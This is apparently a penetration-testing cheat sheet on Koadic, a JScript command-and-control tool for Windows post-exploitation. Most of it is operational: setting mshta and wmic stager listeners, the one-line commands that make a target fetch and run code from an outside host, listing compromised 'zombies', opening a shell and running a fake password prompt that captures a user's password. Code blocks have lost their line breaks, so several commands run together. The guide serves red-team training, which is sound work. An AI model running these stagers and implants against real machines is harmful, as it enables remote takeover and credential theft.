# Windows - Post Exploitation Koadic

# Koadic C3 COM Command & Control - JScript RAT

> Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.

## Installation

    git clone https://github.com/zerosum0x0/koadicgit submodule initgit submodule updatepip2.7 install -r requirements.txt --userpython2.7 koadic

## Set a listener

    use stager/js/mshtaset LHOST 192.168.1.19set SRVPORT 4444run[>] mshta http://192.168.1.19:4444/6DX7f

    use stager/js/wmicset LHOST 192.168.1.19set SRVPORT 4444run[>] wmic os get /FORMAT:"http://192.168.1.19:4444/lQGx5.xsl"

### Stagers

Stagers hook target zombies and allow you to use implants.

[Untitled](Windows%20Post%20Exploitation%20Koadic/Untitled%20Database.csv)

## List zombies and interact with them

    (koadic: sta/js/wmic)$ zombiesID   IP              STATUS  LAST SEEN---  ---------       ------- ------------0    192.168.1.30    Alive   2018-10-04 17:07:12(koadic: sta/js/wmic)$ zombies 0ID:                     0Status:                 AliveFirst Seen:             2018-10-04 17:05:00Last Seen:              2018-10-04 17:14:42IP:                     192.168.1.30User:                   DESKTOP-68URA9U\CrashWin[...]Elevated:               No[...]

Interact with `zombies zombie_id`, get a shell with `cmdshell zombie_id`.

    [koadic: ZOMBIE 0 (192.168.1.30) - C:\Users\CrashWin]> whoami[*] Zombie 0: Job 1 (implant/manage/exec_cmd) created.[+] Zombie 0: Job 1 (implant/manage/exec_cmd) completed.Result for `cd C:\Users\CrashWin & whoami`:desktop-68ura9u\crashwin

## Use an implant

Select an implant with `use module`, then fill the `info` with `set INFO value`, finally start the module with `run`.

    (koadic: sta/js/mshta)$ use implant/phish/password_box(koadic: imp/phi/password_box)$ set ZOMBIE 1(koadic: imp/phi/password_box)$ runInput contents:MyStrongPassword123!

### Implants

Implants start jobs on zombies.

[Untitled](Windows%20Post%20Exploitation%20Koadic/Untitled%20Database%201.csv)

## References

- [Pentestlab - koadic](https://pentestlab.blog/tag/koadic/)
- [zerosum0x0 Github - koadic](https://github.com/zerosum0x0/koadic)